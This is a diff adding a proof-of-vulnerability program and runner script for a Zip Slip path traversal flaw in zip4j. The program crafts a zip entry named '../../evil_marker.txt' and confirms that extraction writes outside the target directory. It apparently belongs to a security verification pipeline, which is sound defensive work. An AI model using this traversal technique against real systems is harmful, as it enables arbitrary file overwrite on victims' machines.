@@ -1,0 +1,163 @@
+diff --git a/.security-pipeline/pov/Zip4jZipSlipPov.java b/.security-pipeline/pov/Zip4jZipSlipPov.java
+new file mode 100644
+index 0000000..bebd654
+--- /dev/null
++++ b/.security-pipeline/pov/Zip4jZipSlipPov.java
+@@ -0,0 +1,133 @@
++import java.io.File;
++import java.io.FileInputStream;
++import java.io.FileOutputStream;
++import java.util.zip.ZipEntry;
++import java.util.zip.ZipOutputStream;
++
++import net.lingala.zip4j.core.ZipFile;
++
++/**
++ * Proof-of-vulnerability for CWE-022 (Zip Slip) in
++ * net.lingala.zip4j.unzip.UnzipEngine.
++ *
++ * Root cause: UnzipEngine.getOutputFileNameWithPath(outPath, newFileName)
++ * (line ~446) builds the extraction target by naively concatenating the
++ * caller-supplied extraction root with the archive-entry-controlled file
++ * name (fileHeader.getFileName()), with no check that the resulting path
++ * stays inside outPath. That single unsanitized path is then used, inside
++ * getOutputStream(...) (lines 416-437), as the input to THREE distinct
++ * filesystem sinks that all trust it:
++ *   - line 424-425: file.getParentFile().mkdirs()  -> arbitrary directory creation
++ *   - line 428-429: file.exists() / file.delete()  -> arbitrary file deletion / overwrite
++ *   - line 432:     new FileOutputStream(file)      -> arbitrary file write (content injection)
++ *
++ * The trust boundary crossed: fileHeader.getFileName() originates from the
++ * central/local directory of a zip archive (HeaderReader.java), which is
++ * fully attacker-controlled input whenever an application extracts a zip
++ * file supplied by an untrusted party (upload, downloaded artifact, etc.).
++ * No component between HeaderReader and getOutputStream ever rejects
++ * "../" sequences, absolute paths, or resolves/verifies the final path
++ * against the intended extraction root.
++ *
++ * This PoV crafts a malicious archive whose single entry is named with a
++ * "../../" traversal sequence, extracts it through the real public API
++ * (ZipFile#extractAll), and asserts that the resulting file lands OUTSIDE
++ * the requested destination directory - i.e. arbitrary file write outside
++ * the extraction root, exercising all three sinks above in one call
++ * (parent-dir mkdirs, delete-if-exists, and the final file write).
++ *
++ * Exit code 0  => vulnerable behavior reproduced (file escaped destPath).
++ * Exit code != 0 => traversal was blocked / file did not escape (patched).
++ */
++public class Zip4jZipSlipPov {
++
++    private static final String MARKER = "ZIP4J_POV_PWNED";
++
++    public static void main(String[] args) throws Exception {
++        File root = new File(System.getProperty("java.io.tmpdir"), "zip4j_zipslip_pov");
++        deleteRecursively(root);
++        root.mkdirs();
++
++        // Intended, "safe" extraction destination the caller passes to zip4j.
++        File destDir = new File(root, "extracted/sub");
++        destDir.mkdirs();
++
++        // Malicious archive entry name: escape two directory levels above
++        // destDir (still inside our controlled temp root, so the PoV is
++        // self-contained), landing in root/evil_marker.txt.
++        String traversalEntryName = "../../evil_marker.txt";
++        File maliciousZip = new File(root, "malicious.zip");
++        buildMaliciousZip(maliciousZip, traversalEntryName, MARKER);
++
++        File expectedEscapedFile = new File(root, "evil_marker.txt");
++        File expectedContainedFile = new File(destDir, "evil_marker.txt");
++
++        boolean extractionThrew = false;
++        try {
++            // Real public API entry point: ZipFile.extractAll -> Unzip ->
++            // UnzipEngine.unzipFile -> getOutputStream -> getOutputFileNameWithPath.
++            ZipFile zipFile = new ZipFile(maliciousZip.getAbsolutePath());
++            zipFile.extractAll(destDir.getAbsolutePath());
++        } catch (Exception e) {
++            // A correct fix is expected to reject the traversal, typically by
++            // throwing when the resolved path escapes the extraction root.
++            extractionThrew = true;
++            System.out.println("extractAll threw: " + e);
++        }
++
++        boolean escaped = expectedEscapedFile.exists()
++                && MARKER.equals(readFile(expectedEscapedFile));
++
++        System.out.println("destDir            = " + destDir.getAbsolutePath());
++        System.out.println("escapedFile exists = " + expectedEscapedFile.exists()
++                + " (" + expectedEscapedFile.getAbsolutePath() + ")");
++        System.out.println("containedFile exists = " + expectedContainedFile.exists());
++        System.out.println("extractionThrew    = " + extractionThrew);
++
++        if (escaped) {
++            System.out.println("VULNERABLE: zip entry \"" + traversalEntryName
++                    + "\" was written outside the extraction root " + destDir.getAbsolutePath()
++                    + " -- Zip Slip / path traversal confirmed via UnzipEngine.getOutputStream().");
++            System.exit(0);
++        } else {
++            System.out.println("NOT VULNERABLE: traversal entry did not escape the extraction root "
++                    + "(path was rejected/sanitized).");
++            System.exit(1);
++        }
++    }
++
++    private static void buildMaliciousZip(File zipFile, String entryName, String content) throws Exception {
++        try (FileOutputStream fos = new FileOutputStream(zipFile);
++             ZipOutputStream zos = new ZipOutputStream(fos)) {
++            ZipEntry entry = new ZipEntry(entryName);
++            zos.putNextEntry(entry);
++            zos.write(content.getBytes("UTF-8"));
++            zos.closeEntry();
++        }
++    }
++
++    private static String readFile(File f) throws Exception {
++        try (FileInputStream fis = new FileInputStream(f)) {
++            byte[] buf = new byte[(int) f.length()];
++            int off = 0;
++            int r;
++            while (off < buf.length && (r = fis.read(buf, off, buf.length - off)) != -1) {
++                off += r;
++            }
++            return new String(buf, "UTF-8");
++        }
++    }
++
++    private static void deleteRecursively(File f) {
++        if (f == null || !f.exists()) {
++            return;
++        }
++        File[] children = f.listFiles();
++        if (children != null) {
++            for (File c : children) {
++                deleteRecursively(c);
++            }
++        }
++        f.delete();
++    }
++}
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100755
+index 0000000..6f504c5
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,18 @@
++#!/usr/bin/env bash
++# Builds the project (if needed) and runs the zip4j Zip Slip PoV.
++# Must be run from /workspace/repo inside the project container.
++set -euo pipefail
++
++REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
++cd "$REPO_ROOT"
++
++if [ ! -d target/classes ]; then
++  mvn -B -DskipTests package -q
++fi
++
++POV_DIR="$REPO_ROOT/.security-pipeline/pov"
++OUT_DIR="$POV_DIR/build"
++mkdir -p "$OUT_DIR"
++
++javac -cp target/classes -d "$OUT_DIR" "$POV_DIR/Zip4jZipSlipPov.java"
++java -cp "target/classes:$OUT_DIR" Zip4jZipSlipPov
